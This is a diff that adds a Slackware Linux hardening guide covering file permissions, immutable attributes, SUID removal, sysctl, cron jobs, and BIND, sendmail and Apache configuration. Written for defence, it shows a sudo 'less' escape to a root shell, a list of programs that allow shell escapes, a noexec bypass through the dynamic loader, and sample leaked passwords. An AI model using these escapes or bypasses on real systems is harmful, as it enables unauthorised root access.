+    Uncomment the following lines:
+
+    chown root /dev/console
+    chown 622 /dev/console
+    exec sessreg -d -l $DISPLAY -h "`echo $DISPLAY | cut -d: -f1`" $USER
+
+/opt/kde/share/config/kdm/Xaccess:
+    Comment out the following lines:
+
+    #*                           #any host can get a login window
+    #*   CHOOSER BROADCAST       #any indirect host can get a chooser
+
+
+
+Access Control Lists:
+
+    TODO
+
+    man acl
+    man setfacl
+    man getfacl
+
+/etc/inittab:
+    Comment out the following line:
+    #ca::ctraltdel:/sbin/shutdown -t5 -r now
+
+    root@darkstar:~# telinit q
+
+    [rant]
+
+    I actually don't think this is necessary.  But I'm including it because
+    just about every security document on Linux recommends it.  It stops anyone
+    from being able to reboot the system by doing a three finger salute.
+    Pressing Ctrl-Alt-Del to reboot the system only works if you have physical
+    access to the system.  Even if you disable this feature, it doesn't stop
+    someone from pulling the power cord or pressing the reset switch to force a
+    reboot.  Most window managers trap Ctrl-Alt-Del anyways.
+
+    The only time that I see disabling the above line as being useful is when
+    you have a Windows admin using Linux.  You don't want them rebooting the
+    system every time they want to lock the system or go to the Task Manager.
+
+    Or you can use /etc/shutdown.allow to control when (not exactly by who) the
+    system can be rebooted with Ctrl-Alt-Del.  There are security concerns with
+    using this method.  Check the man page for shutdown for details.
+
+    [/rant]
+
+    Add "-a" to the following line in /etc/inittab to use
+    /etc/shutdown.allow:
+
+    ca::ctraltdel:/sbin/shutdown -t5 -r now -a
+
+    root@darkstar:~# telinit q
+
+    I like to use dumb terminals.  Uncomment the following line:
+    s1:12345:respawn:/sbin/agetty -L ttyS0 9600 vt100
+
+    root@darkstar:~# telinit q
+
+    man init
+    man inittab
+    man initscript
+    man shutdown
+    man telinit
+
+/etc/shutdown.allow:
+    dentonj
+
+    man shutdown
+
+/etc/securetty:
+    Make sure only the following are uncommented:
+        console
+        tty1
+        tty2
+        tty3
+        tty4
+        tty5
+        tty6
+
+    man securetty
+
+umask:
+    There are several ways to set umask:
+
+        /etc/login.defs:
+            UMASK       077
+
+        /etc/limits:
+            * K077
+
+        /etc/profile:
+            umask 077
+
+    Umask controls what the initial permissions are for newly created files and
+    directories.  With a umask of 022, new files have the permissions of 644
+    and new directories have the permissions of 755.  Setting the umask to 077
+    will result in new files being created with the permissions of 600 and new
+    directories will have the permissions of 700.
+
+    Using the umask of 077 will keep others from being able to access users
+    files.  Using a umask of 022 will allow others access to the users files
+    unless the users takes the time to change the permissions.  You can use
+    cron to periodically remove permissions from the user's home directories.
+
+    Setting a restrictive umask can cause problems when you commonly edit
+    or create files that need to be read accessable to everyone.  An example
+    of files that everyone needs to be able to read are web server pages
+    located in /var/www/htdocs.
+
+    dentonj@darkstar:~$ type -a umask
+
+    man bash
+    man umask
+    man login.defs
+    man limits
+
+
+----[ Filesystem ]----
+
+
+/etc/fstab:
+    /dev/hdb1   swap            swap   defaults                         0 0
+    /dev/hdb5   /               ext3   defaults                         1 1
+    /dev/hdb6   /var            ext3   rw,nosuid,nodev                  0 2
+    /dev/hdb7   /tmp            ext3   rw,nosuid,nodev,noexec           0 2
+    /dev/hdb8   /usr            ext3   ro                               0 2
+    /dev/hdb9   /home           ext3   rw,nosuid,nodev                  0 0
+    /dev/hda1   /mnt/windows    vfat   rw,nosuid,nodev,noexec,noauto    0 0
+    /dev/hda2   /mnt/slack      ext2   rw,noauto                        0 0
+    /dev/cdrom  /mnt/cdrom      auto   noauto,owner,ro                  0 0
+    /dev/fd0    /mnt/floppy     auto   noauto,owner                     0 0
+    devpts      /dev/pts        devpts gid=5,mode=620                   0 0
+    proc        /proc           proc   defaults                         0
+
+    root@darkstar:~# mkdir /mnt/windows
+    root@darkstar:~# mkdir /mnt/slack
+    root@darkstar:~# mkdir /mnt/floppy
+    root@darkstar:~# mkdir /mnt/thumb
+
+    man fstab
+    man nfs
+    man mount
+
+    I use to add "noexec" to /home, but that mount option is pretty trivial to
+    bypass.  Besides, I like having a ~/bin directory for my scripts.
+
+    dentonj@darkstar:~$ /lib/ld-linux.so.2 ./some_executable
+
+    man ld.so
+
+/sbin/tune2fs:
+    Stop fsck from running every 22 boots.  The new setting means fsck only
+    runs every 6 months.  If you would like to fsck more often, then adjust
+    as necessary.
+
+    root@darkstar:~# tune2fs -l /dev/hdb5
+    root@darkstar:~# for i in hdb5 hdb6 hdb7 hdb8 hdb9; do
+    > tune2fs -c 0 /dev/$i
+    > done
+    root@darkstar:~# tune2fs -l /dev/hdb5
+
+    man tune2fs
+    man fsck
+
+/usr/bin/chattr:
+    Make these files immutable:
+    - init/rc scripts
+    - shell, environment, login config files
+    - passwd files
+    - server config files
+    - suid/sgid executables
+    - commonly trojaned executables
+
+        for i in `ls /etc/rc.d`; do
+        chattr +i /etc/rc.d/$i
+        done
+
+        for i in `ls /etc/apache`; do
+        chattr +i /etc/apache/$i
+        done
+
+        for i in `ls /etc/mail`; do
+        chattr +i /etc/mail/$i
+        done
+
+        find / -type f \( -perm -4000 -o -perm -2000 \) -exec chattr +i {} \;
+
+        chattr +i /etc/at.deny
+        chattr +i /etc/exports
+        chattr +i /etc/ftpusers
+        chattr +i /etc/host.conf
+        chattr +i /etc/hosts
+        chattr +i /etc/hosts.allow
+        chattr +i /etc/hosts.deny
+        chattr +i /etc/hosts.equiv
+        chattr +i /etc/hosts.lpd
+        chattr +i /etc/inetd.conf
+        chattr +i /etc/inittab
+        chattr +i /etc/lilo.conf
+        chattr +i /etc/login.access
+        chattr +i /etc/login.defs
+        chattr +i /etc/named.conf
+        chattr +i /etc/porttime
+        chattr +i /etc/profile
+        chattr +i /etc/protocols
+        chattr +i /etc/securetty
+        chattr +i /etc/services
+        chattr +i /etc/suauth
+        chattr +i /home/dentonj/.forward
+        chattr +i /home/dentonj/.netrc
+        chattr +i /home/dentonj/.rhosts
+        chattr +i /home/dentonj/.shosts
+
+        less /usr/local/sbin/chkrootkit
+        /TROJAN
+        chattr +i <the commands listed in the variable TROJAN>
+
+    This list should be much longer.
+
+    root@darkstar:~# chmod go-rwx /usr/bin/chattr /usr/bin/lsattr
+
+    man chattr
+
+lcap:
+    TODO - list where is can be found and how to compile it.
+
+    Remove the CAP_LINUX_IMMUTABLE kernel capability.  This prevents the +i
+    attribute from being removed.  I run `lcap` from rc.local.  This file is
+    sourced from the file rc.M.  To remove the +i attribute from a file, you'll
+    have to reboot the system and go into single user mode.  This is one of the
+    few times when you really have to reboot Linux.
+
+    If you only access and manage the system remotely, using lcap may cause
+    problems.
+
+    Note: Do this after you are finished with configuring your system.
+
+    /etc/rc.d/rc.local:
+        /usr/local/sbin/lcap CAP_LINUX_IMMUTABLE
+
+    root@darkstar:~# touch /tmp/test
+    root@darkstar:~# chattr +i /tmp/test
+    root@darkstar:~# lsattr /tmp/test
+    ----i-------- /tmp/test
+    root@darkstar:~# cd
+    root@darkstar:~# lcap CAP_LINUX_IMMUTABLE
+    root@darkstar:~# chattr -i /tmp/test
+    chattr: Operation not permitted while setting flags on /tmp/test
+    root@darkstar:~# lcap
+    Current capabilities: 0xFFFFFCFF
+       0) *CAP_CHOWN                   1) *CAP_DAC_OVERRIDE
+       2) *CAP_DAC_READ_SEARCH         3) *CAP_FOWNER
+       4) *CAP_FSETID                  5) *CAP_KILL
+       6) *CAP_SETGID                  7) *CAP_SETUID
+       8)  CAP_SETPCAP                 9)  CAP_LINUX_IMMUTABLE
+      10) *CAP_NET_BIND_SERVICE       11) *CAP_NET_BROADCAST
+      12) *CAP_NET_ADMIN              13) *CAP_NET_RAW
+      14) *CAP_IPC_LOCK               15) *CAP_IPC_OWNER
+      16) *CAP_SYS_MODULE             17) *CAP_SYS_RAWIO
+      18) *CAP_SYS_CHROOT             19) *CAP_SYS_PTRACE
+      20) *CAP_SYS_PACCT              21) *CAP_SYS_ADMIN
+      22) *CAP_SYS_BOOT               23) *CAP_SYS_NICE
+      24) *CAP_SYS_RESOURCE           25) *CAP_SYS_TIME
+      26) *CAP_SYS_TTY_CONFIG
+        * = Capabilities currently allowed
+
+/etc/cron.*:
+    root@darkstar:~# chmod -R go-rwx /etc/cron.*
+
+/etc/rc.d:
+    The system startup scripts are world readable by default.
+
+    root@darkstar:~# chmod -R go-rwx /etc/rc.d/
+
+$HOME:
+    Limit access to $HOME directories:
+
+    root@darkstar:~# chmod -R go-wrx /home/dentonj
+    root@darkstar:~# chmod -R go-rwx /root
+
+    man chmod
+
+/var/log:
+    Limit access to logs:
+
+    root@darkstar:~# chmod -R o-rwx /var/log
+
+The following files should be empty if they exist:
+    /etc/X0.hosts
+    /etc/d_passwd
+    /etc/dialups
+    /etc/environment
+    /etc/exports
+    /etc/hosts.lpd
+    /etc/hosts.equiv
+    /etc/ssh/shosts.equiv
+    ~/.forward
+    ~/.netrc
+    ~/.rhosts
+    ~/.shosts
+
+Files that normally shouldn't exist:
+    /etc/fastboot
+    /etc/forcefsck
+    /etc/hushlogins
+    /etc/initrunlvl
+    /etc/initscript
+    /etc/nologin
+    /etc/powerstatus
+    /etc/upsstatus
+    ~/.hushlogin
+
+Find SUID/SGID files and directories:
+    root@darkstar:~# find / -type f \( -perm -4000 -o -perm -2000 \) \
+    > -ls > suid_files.out
+    root@darkstar:~# find / -type d \( -perm -4000 -o -perm -2000 \) \
+    > -ls > suid_dirs.out
+
+Find world and group writable files and directories:
+    root@darkstar:~# find / -type f \( -perm -2 -o -perm -20 \) \
+    > -ls > write_files.out
+    root@darkstar:~# find / -type d \( -perm -2 -o -perm -20 \) \
+    > -ls > write_dirs.out
+
+SUID/SGID:
+    Remove the SUID or SGID bit from the following files:
+        chmod u-s /usr/bin/at
+        chmod u-s /usr/bin/chage
+        chmod u-s /usr/bin/chfn
+        chmod u-s /usr/bin/chsh
+        chmod u-s /usr/bin/crontab
+        chmod u-s /usr/bin/expiry
+        chmod u-s /usr/bin/gpasswd
+        chmod u-s /usr/bin/lppasswd
+        chmod u-s /usr/bin/newgrp
+        chmod u-s /usr/bin/rcp
+        chmod u-s /usr/bin/rlogin
+        chmod u-s /usr/bin/rsh
+        chmod u-s /usr/libexec/ssh-keysign
+
+    man chmod
+
+Shell Escapes:
+    The following is a list of programs that can escape to a shell.  This can
+    either be done by directly starting a new shell, executing shell commands
+    (which is used to start a shell), or by opening an text editor that can be
+    used to start a shell.
+
+    These programs are not a security concern by themselves.  However, if they
+    are set SUID root or used with sudo, the programs can allow users access to
+    a root shell.
+
+    /etc/sudoers:
+        dentonj ALL = (ALL) /usr/bin/less /var/log/messages
+
+    Start a new shell:
+        dentonj@darkstar:~$ sudo /usr/bin/less /var/log/messages
+        Password:
+        <contents of /var/log/messages>
+        !
+        bash-3.00#
+
+    Open an editor that can start a new shell:
+        dentonj@darkstar:~$ sudo /usr/bin/less /var/log/messages
+        Password:
+        <contents of /var/log/messages>
+        v
+        :sh
+        bash-3.00#
+
+    Make sure these are not SUID and owned by root.  Also make sure they don't
+    end up in /etc/sudoers.  This list is not complete.
+
+        /bin/ed                         /bin/more
+        /usr/bin/bzmore                 /usr/bin/crontab -e
+        /usr/bin/cscope                 /usr/bin/cu
+        /usr/bin/cvs -e                 /usr/bin/cvsbug
+        /usr/bin/elm                    /usr/bin/elvis
+        /usr/bin/ex                     /usr/bin/flea
+        /usr/bin/gccbug                 /usr/bin/gdb
+        /usr/bin/less                   /usr/bin/lftp
+        /usr/bin/mailto                 /usr/bin/mc
+        /usr/bin/mcedit                 /usr/bin/mcview
+        /usr/bin/mutt                   /usr/bin/mysql
+        /usr/bin/mysqlbug               /usr/bin/nail
+        /usr/bin/ncftp                  /usr/bin/newspost
+        /usr/bin/nn                     /usr/bin/perlbug
+        /usr/bin/pilot                  /usr/bin/pine
+        /usr/bin/pg                     /usr/bin/rpcclient
+        /usr/bin/sdiff                  /usr/bin/slrn
+        /usr/bin/smbclient              /usr/bin/tin
+        /usr/bin/trn                    /usr/bin/uupick
+        /usr/bin/vim                    /usr/bin/zmore
+
+    A couple of the things that I used to figure out which commands allow shell
+    escapes.
+
+    root@darkstar:~# cd /usr/bin && for i in `ls | grep -v "@$"`; do
+    > echo "     $i"
+    > strings $i | grep -e "VISUAL|EDITOR"
+    > done | less
+    root@darkstar:~# cd /usr/man/man1 && zgrep -E \
+    > "\!.*command|execute.*command" *
+
+Find and delete dead symlinks:
+    find / -type l -print | perl -nle '-e || print'
+
+
+----[ Network ]----
+
+
+/etc/rc.d/rc.local:
+    # Stop arp spoofing used to sniff switched networks
+    # Set a static ARP entry for the default gateway
+    arp -s 192.168.1.1 00:00:FE:ED:FA:CE
+
+    # Set a static ARP entry for the log host
+    arp -s 192.168.1.2 00:00:DE:AD:BE:EF
+
+/etc/rc.d/rc.firewall:
+    The file /etc/rc.d/rc.inet2 check for the existance and then runs
+    rc.firewall.  Create a firewall script and place it here.
+
+
+----[ Cron ]----
+
+
+/etc/cron.daily/ntpdate:
+    #!/bin/sh
+    /usr/sbin/ntpdate clock.via.net && /sbin/hwclock --systohc
+
+    root@darkstar:~# chmod 700 /etc/cron.daily/ntpdate
+
+/etc/cron.daily/cleanup:
+    #!/bin/sh
+    /usr/bin/find / -type f -name core -exec /bin/rm -f {} \;
+    /usr/bin/find /tmp -atime +7 -exec /bin/rm -f {} \;
+    /usr/bin/find /var/tmp -atime +7 -exec /bin/rm -f {} \;
+
+    root@darkstar:~# chmod 700 /etc/cron.daily/cleanup
+
+/etc/cron.daily/paranoid:
+    #!/bin/sh
+    /bin/chmod -R go-rwx /home/dentonj
+    /bin/chmod -R go-rwx /root
+    /bin/chmod -R o-rwx /var/log
+    /bin/rm -f /home/dentonj/dead.letter
+
+    root@darkstar:~# chmod 700 /etc/cron.daily/paranoid
+
+/var/spool/cron/crontabs/root:
+    0 3 * * * /usr/bin/find /home -name .rhosts -o -name .forward -ls
+
+    Cron should mail the results to root.
+
+    root@darkstar:~# crontab -l
+    root@darkstar:~# crontab -e
+
+    man crond
+    man crontab
+
+/etc/at.allow:
+    root@darkstar:~# rm /etc/at.deny
+    root@darkstar:~# touch /etc/at.allow
+
+    Don't allow anyone to use at.
+
+    Even better, remove at from the system:
+
+    root@darkstar:~# removepkg at
+
+    man at
+
+
+----[ Bash ]----
+
+
+
+~/.bash_history:
+    Set the history file so that it can only be appended and not erased by a
+    user.
+
+    root@darkstar:~# chattr +a /home/dentonj/.bash_history
+    root@darkstar:~# chmod go-wrx /usr/bin/chattr /usr/bin/lsattr
+
+    man chattr
+    man lsattr
+    man chmod
+
+~/.bash_profile:
+    trap 'test -n "$SSH_AGENT_PID" && eval `/usr/bin/ssh-agent -k`' 0
+
+
+----[ Kernel ]----
+
+
+/etc/sysctl.conf:
+    # Improve file system performance
+    vm.bdflush = 60 64 64 256 500 300 80 0 0
+
+    # Increase swap bandwidth system performance
+    vm.kswapd = 512 32 32
+
+    # Enables/Disables memory over commitment
+    vm.overcommit_memory = 0
+
+    # Increases number of page tables keeps in a per-processor cache
+    vm.pagetable_cache = 25 50
+
+    # Increase limit of file-handles
+    fs.file-max = 8192
+
+    # Enable/Disable ignoring ping request
+    net.ipv4.icmp_echo_ignore_all = 1
+
+    # Enable/Disable ignoring broadcasts request
+    net.ipv4.icmp_ignore_broadcasts = 1
+
+    # Enable/Disable IP source routing
+    net.ipv4.conf.all.accept_source_route = 0
+    net.ipv4.conf.default.accept_source_route = 0
+
+    # Enable/Disable TCP SYN cookie protection
+    net.ipv4.tcp_syncookies = 1
+
+    # Enable/Disable ICMP redirect acceptance
+    net.ipv4.conf.all.accept_redirects = 0
+    net.ipv4.conf.default.accept_redirects = 0
+
+    # Enable/Disable bad error message protection
+    net.ipv4.icmp_ignore_bogus_error_responses = 1
+
+    # Enable/Disable IP spoofing protection
+    net.ipv4.conf.all.rp_filter = 2
+    net.ipv4.conf.default.rp_filter = 2
+
+    # Enable/Disable log spoofed, source routed,redirect packets
+    net.ipv4.conf.all.log_martians = 1
+    net.ipv4.conf.default.log_martions = 1
+
+    # Improve shared memory size
+    kernel.shmall = 134217728
+    kernel.shmmax = 134217728
+
+    # Improve default and maximum window sizes
+    net.core.vmem_max = 2048000
+    net.core.vmem_default = 204800
+
+    # Enable packet forwarding
+    net.ipv4.ip_forward = 0
+
+    # Change the default TTL to help obscure OS fingerprinting
+    net.ipv4.ip_default_ttl = 128
+
+    root@darkstar:~# sysctl -p /etc/sysctl.conf
+    root@darkstar:~# sysctl -A
+
+    These is already an entry in /etc/rc.d/rc.S that will set the
+    sysctl settings located in this file during bootup.
+
+    man sysctl
+    man sysctl.conf
+
+/etc/rc.d/rc.modules:
+    List the kernel modules that are loaded during bootup.  Comment out the
+    ones you feel are unnecessary.
+
+    root@darkstar:~# grep -v "^#\|^$" /etc/rc.d/rc.modules
+
+Grsecurity:
+
+    TODO
+
+Remove support for kernel modules:
+    From Phrack 25-5, "Unix Cracking Tips":
+        "After you gain superuser privileges and you wish to stay root,
+        here are a few suggestions for installing backdoors:
+        . . .
+        - Install new system calls
+        . . ."
+
+    Then read Phrack 52-8, "Weakening the Linux Kernel".  Then compile your
+    kernel to remove supports for modules.
+
+    CONFIG_MODULES=n
+
+
+----[ Misc Stuff ]----
+
+/etc/inputrc:
+    set bell-style none
+    set mark-directories on
+    set mark-modified-lines on
+    set match-hidden-files on
+    set show-all-if-ambiguous on
+    set visible-stats on
+
+    man bash
+    man readline
+
+Stuff to remove:
+    root@darkstar:~# removepkg nn
+    root@darkstar:~# removepkg slrn
+    root@darkstar:~# removepkg uucp
+    root@darkstar:~# removepkg strace
+    root@darkstar:~# removepkg gdb
+    root@darkstar:~# removepkg nc
+    root@darkstar:~# removepkg nmap
+    root@darkstar:~# removepkg at
+
+    This list should be much longer.
+
+/etc/rc.d/rc.local:
+    # This is hard drive specific, your settings will vary
+    /usr/sbin/hdparm -c3 -a16 -W1 -u1 /dev/hdb
+
+    # Turn on NumLock
+    /usr/bin/setleds -D +num
+
+Make a backup of commonly trojaned commands:
+    Only do this after a fresh install. Making copies of already trojaned
+    commands will just ruin your day.  If you don't have a fresh install, copy
+    the commands from the "Live" CD that comes with the official version of
+    Slackware.
+
+    root@darkstar:~# mkdir bin
+
+    Copy the following to /root/bin:
+
+        /bin/date                       /bin/du
+        /bin/echo                       /bin/grep
+        /bin/kill                       /bin/killall
+        /bin/login                      /bin/ls
+        /bin/netstat                    /bin/ps
+        /bin/su                         /bin/tar
+        /sbin/agetty                    /sbin/explodepkg
+        /sbin/getty                     /sbin/ifconfig
+        /sbin/installpkg                /sbin/makepkg
+        /sbin/pidof                     /sbin/removepkg
+        /sbin/upgradepkg                /usr/bin/basename
+        /usr/bin/biff                   /usr/bin/chfn
+        /usr/bin/chsh                   /usr/bin/crontab
+        /usr/bin/dirname                /usr/bin/env
+        /usr/bin/find                   /usr/bin/lsattr
+        /usr/bin/nail                   /usr/bin/passwd
+        /usr/bin/pstree                 /usr/bin/ssh
+        /usr/bin/top                    /usr/bin/traceroute
+        /usr/bin/write                  /usr/sbin/gpm
+        /usr/sbin/hdparm                /usr/sbin/in.fingerd
+        /usr/sbin/in.identd             /usr/sbin/in.rlogind
+        /usr/sbin/in.rshd               /usr/sbin/in.telnetd
+        /usr/sbin/in.timed              /usr/sbin/inetd
+        /usr/sbin/ipop3d                /usr/sbin/named
+        /usr/sbin/rpcinfo               /usr/sbin/sendmail
+        /usr/sbin/sshd                  /usr/sbin/syslogd
+        /usr/sbin/tcpd
+
+    root@darkstar:~# cd bin
+    root@darkstar:~/bin# md5sum * >> md5sum
+    root@darkstar:~/bin# cd
+    root@darkstar:~# tar zcvf bin.tar.gz ./bin
+    root@darkstar:~# cp bin.tar.gz /mnt/thumb
+
+    It would be a good idea to run `chattr +i ...` on all of the original files.
+
+Passwords in logs and history files:
+    It's not uncommon for someone to make a mistake while logging in or
+    switching users and type the password in the wrong place.  Be aware that
+    "dumpster diving" in system logs and other users history files is a common
+    practice by evil doers to obtain passwords.  Keep this in mind when
+    deciding to store 6 months worth of logs or when setting HISTFILESIZE to a
+    $LARGENUMBER.
+
+    root@darkstar:~# lastb
+    P@ssw0rd1!                             Fri Jun 23 19:04 - 19:04  (00:00)
+    dentonj                                Fri Jun 23 19:03 - 19:03  (00:00)
+
+    root@darkstar:~# less /home/dentonj/.bash_history
+    <contents of .bash_history>
+    /us                                 <-- type this to search for "us"
+    . . .
+    us -
+    !QAZzaq1
+    . . .
+
+/etc/wgetrc:
+    Ignore the robots.txt file on web servers.
+
+    robots = off
+
+
+----[ Program Hardening ]----
+
+/usr/sbin/atalkd:
+    TODO
+    /etc/netatalk/atalkd.conf:
+
+    /etc/netatalk/afpd.conf:
+
+    /etc/netatalk/AppleVolumes.default:
+
+    /etc/netatalk/AppleVolumes.system:
+
+    /etc/netatalk/netatalk.conf:
+
+    /etc/netatalk/papd.conf:
+
+    man afpd
+    man afpd.conf
+    man AppleVolumes.default
+    man atalkd
+    man atalkd.conf
+    man netatalk.conf
+    man papd
+
+/usr/sbin/named:
+
+    /etc/named.conf:
+      acl "allowed" {
+              localhost;
+              192.168.1.0/24;
+      };
+
+      acl "denied" {
+              0.0.0.0/8;
+              1.0.0.0/8;
+              2.0.0.0/8;
+              192.0.2.0/24;
+              224.0.0.0/3;
+              169.254.0.0/16;
+              10.0.0.0/8;
+              172.16.0.0/12;
+              //192.168.0.0/16;
+      };
+
+      key "rndc-key" {
+              algorithm hmac-md5;
+              secret "Thisisafakekey==";
+      };
+
+      controls {
+              inet 127.0.0.1 port 953
+                   allow { 127.0.0.1; } keys { "rndc-key"; };
+      };
+
+      options {
+              directory "/var/named";
+              allow-transfer { none; };
+              allow-query { allowed; };
+              allow-recursion { allowed; };
+              blackhole { denied; };
+              tcp-clients 32;
+              forwarders { 1.2.3.4; 5.6.7.8; };
+              version "Not available";
+      };
+
+      logging {
+              category lame-servers { null; };
+      };
+
+      zone "." IN {
+              type hint;
+              file "caching-example/named.ca";
+      };
+
+      zone "localhost" IN {
+              type master;
+              file "caching-example/named.local";
+              allow-update { none; };
+              notify no;
+      };
+
+      zone "0.0.127.in-addr.arpa" IN {
+              type master;
+              file "caching-example/named.local";
+              allow-update { none; };
+              notify no;
+       };
+
+    /etc/rndc.conf:
+
+      key "rndc-key" {
+              algorithm hmac-md5;
+              secret "Thisisafakekey==";
+      };
+
+      options {
+              default-key "rndc-key";
+              default-server 127.0.0.1;
+              default-port 953;
+      };
+
+    To generate the keys for rndc:
+
+    root@darkstar:~# rndc-confgen -b 512
+    To check the configuration:
+
+    root@darkstar:~# named-checkconf -z
+    zone localhost/IN: loaded serial 42
+    zone 0.0.127.in-addr.arpa/IN: loaded serial 1997022700
+    root@darkstar:~# named-checkzone localhost \
+        /var/named/caching-example/localhost.zone
+    zone localhost/IN: loaded serial 42
+    OK
+    root@darkstar:~# named-checkzone 0.0.127.in-addr.arpa \
+        /var/named/caching-example/named.local
+    zone 0.0.127.in-addr.arpa/IN: loaded serial 1997022700
+    OK
+    root@darkstar:~# named-checkzone . /var/named/caching-example/named.ca
+    zone ./IN: has 0 SOA records
+
+    root@darkstar:~# chmod 700 /etc/rc.d/rc.bind
+    root@darkstar:~# /etc/rc.d/rc.bind start
+    root@darkstar:~# rndc status
+
+    man named
+    man named-checkconf
+    man named-checkzone
+    man rndc
+    man rndc.conf
+    man rndc-confgen
+    man lwresd
+
+    TODO - Chroot
+
+/usr/sbin/sendmail:
+
+    /etc/mail/sendmail.cf:
+        #O DontBlameSendmail=Safe
+        O MaxHopCount=25
+        O HelpFile=/etc/issue.net
+        O ForwardPath=/etc/forward
+        O LogLevel=15
+        #O DaemonPortOptions=Name=MTA
+        #O DaemonPortOptions=Port=587,Name=MSA,M=E
+        O DaemonPortOptions=Address=127.0.0.1
+        O ClientPortOptions=Family=inet,Address=127.0.0.1
+        O PrivacyOptions=goaway,noreceipts,restrictmailq,restrictqrun,
+          restrictexpand,noetrn,nobodyreturn
+        O Timeout.ident=0
+        O SmtpGreetingMessage=$j Unauthorized Access Prohibited.
+        O AllowBogusHELO=False
+        O UnsafeGroupWrites=True
+        O RrtImpliesDSN=False
+        $.by $j with id $i$?{tls_version}
+
+    root@darkstar:~# touch /etc/forward
+
+    $HOME/.forward:
+        The .forward file allows users to easily forward email.  However, the
+        file can also be used to run a program every time an email is received.
+        There are several ways to disable use of the .forward file.
+
+        Set the ForwardPath option so that it points to something other than
+        the default.  The option has to be set to something, otherwise sendmail
+        sets ForwardPath to $HOME/.forward.
+
+            O ForwardPath=/etc/forward
+
+        You can allow programs to be run, but restrict which ones can be run by
+        using smrsh.
+
+        You can disable forwarding in sendmail all together.  However, the bat
+        book warns that Bad Things(TM) can happen is you completely disable
+        forwarding.  Remove the "w" flag from the line located in
+        /etc/mail/sendmail.cf:
+
+        Mlocal,         P=/usr/bin/procmail, F=lsDFMAw5:/|@qSPfhn9, S=.....
+
+        Mlocal,         P=/usr/bin/procmail, F=lsDFMA5:/|@qSPfhn9, S=.....
+
+        You can try to have root create and own the .forward file in each of
+        the user's home directories.  But the user can move the .forward file
+        and create a new file.
+
+        root@darkstar:~# touch /home/dentonj/.forward
+        dentonj@darkstar:~$ ls -l .forward
+        -rw-r--r--  1 root root 0 2001-06-27 20:17 .forward
+        dentonj@darkstar:~$ mv .forward .forward.moved
+        dentonj@darkstar:~$ ls -l .forward.moved
+        -rw-r--r--  1 root root 0 2001-06-27 20:17 .forward.moved
+
+        However, making the file immutable stops this.
+
+        root@darkstar:~# touch /home/dentonj/.forward
+        root@darkstar:~# chattr +i /home/dentonj/.forward
+        root@darkstar:~# lsattr /home/dentonj/.forward
+        ----i-------- /home/dentonj/.forward
+        root@darkstar:~# chmod go-rwx /usr/bin/chattr /usr/bin/lsattr
+        dentonj@darkstar:~$ ls -l .forward
+        -rw-r--r--  1 root root 0 2001-06-27 20:19 .forward
+        dentonj@darkstar:~$ mv .forward .forward.moved
+        mv: cannot move `.forward' to `.forward.moved': Operation not permitted
+
+    /usr/sbin/smrsh:
+
+        TODO
+
+    /etc/mail/aliases:
+        I use to comment out most of these.  Now I'm more interested if someone
+        actually tries to send email to any of them.
+
+        postmaster:     root, dentonj
+        bin:            root, dentonj
+        daemon:         root, dentonj
+        games:          root, dentonj
+        ingres:         root, dentonj
+        nobody:         root, dentonj
+        system:         root, dentonj
+        toor:           root, dentonj
+        uucp:           root, dentonj
+        manager:        root, dentonj
+        dumper:         root, dentonj
+        webmaster:      root, dentonj
+        abuse:          root, dentonj
+        decode:         root, dentonj
+
+        Add any additional system account present in /etc/passwd:
+
+        admin:          root, dentonj
+        ftp:            root, dentonj
+        mail:           root, dentonj
+        mysql:          root, dentonj
+        smmsp:          root, dentonj
+        sshd:           root, dentonj
+
+        root@darkstar:~# newaliases
+
+        man aliases
+        man newaliases
+
+    If you only need to run sendmail for local mail, use cron.
+
+    root@darkstar:~# /etc/rc.d/rc.sendmail stop
+    root@darkstar:~# chmod 600 /etc/rc.d/rc.sendmail
+
+    /etc/cron.hourly/mqueue
+        #!/bin/sh
+        /usr/sbin/sendmail -q
+
+    root@darkstar:~# chmod 700 /etc/cron.hourly/mqueue
+
+    man crond
+
+/usr/sbin/httpd:
+
+    root@darkstar:~# groupadd -g 80 http
+    root@darkstar:~# useradd -u 80 -g 80 http
+
+    /etc/apache/httpd.conf:
+        #LoadModule includes_module     libexec/apache/mod_include.so
+        #LoadModule autoindex_module    libexec/apache/mod_autoindex.so
+        #LoadModule speling_module      libexec/apache/mod_speling.so
+        #LoadModule userdir_module      libexec/apache/mod_userdir.so
+        #LoadModule anon_auth_module    libexec/apache/mod_auth_anon.so
+        #LoadModule digest_module       libexec/apache/mod_digest.so
+        #LoadModule proxy_module        libexec/apache/mod_proxy.so
+        #LoadModule cern_meta_module    libexec/apache/mod_cern_meta_module.so
+        #LoadModule usertrack_module    libexec/apache/mod_usertrack.so
+        #LoadModule unique_id_module    libexec/apache/mod_unique_id.so
+        #AddModule mod_includes.c
+        #AddModule mod_autoindex.c
+        #AddModule mod_speling.c
+        #AddModule mod_userdir.c
+        #AddModule mod_auth_anon.c
+        #AddModule mod_digest.c
+        #AddModule mod_proxy.c
+        #AddModule mod_cern_meta.c
+        #AddModule mod_usertrack.c
+        #AddModule mod_unique_id.c
+        User http
+        Group http
+        ServerAdmin root@localhost
+        <Directory "/var/www/htdocs">
+            Options FollowSymLinks MultiViews
+        UseCanonicalName Off
+        LogLevel info
+LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %T"
+        CustomLog /var/log/apache/access_log combined
+        ServerSignature Off
+        ServerTokens ProductOnly
+        <Directory "/var/www/icons">
+            Options MultiViews
+        #Alias /manual/ "/var/www/htdocs/manual/"
+        #<Directory "/var/www/htdocs/manual">
+        #    Options Indexes FollowSymLinks MultiViews
+        #    AllowOverride None
+        #    Order allow,deny
+        #    ALlow from all
+        #</Directory>
+        #ScriptAlias /cgi-bin/ "/var/www/cgi-bin/"
+        #<Directory "/var/www/cgi-bin">
+        #    AllowOverride None
+        #    Options None
+        #    Order allow,deny
+        #    Allow from all
+        #</Directory>
+
+    /etc/logrotate.d/httpd:
+        /var/log/apache/access_log /var/log/apache/error_log {
+                create 0640 root root
+                mail dentonj@gmail.com
+                mailfirst
+                sharedscripts
+                postrotate
+                        /bin/kill -HUP `cat /var/run/httpd.pid \
+                        2> /dev/null || true`
+                endscript
+        }
+
+    dentonj@darkstar:~$ links /var/www/htdocs/manual/misc/security_tips.html
+
+    PHP:
+
+    Fortunately, PHP is disabled by default.  But if you insist on letting the
+    script kiddies have free reign of your system, there are a few things you
+    can do to slow them down.
+
+    /etc/apache/httpd.conf:
+        Include /etc/apache/mod_php.conf
+
+    /etc/apache/php.ini:
+        display_errors = Off
+        log_errors = On
+        error_log = /var/log/apache/php_errors
+        register_globals = Off
+        variables_order = "ES"
+        expose_php = Off
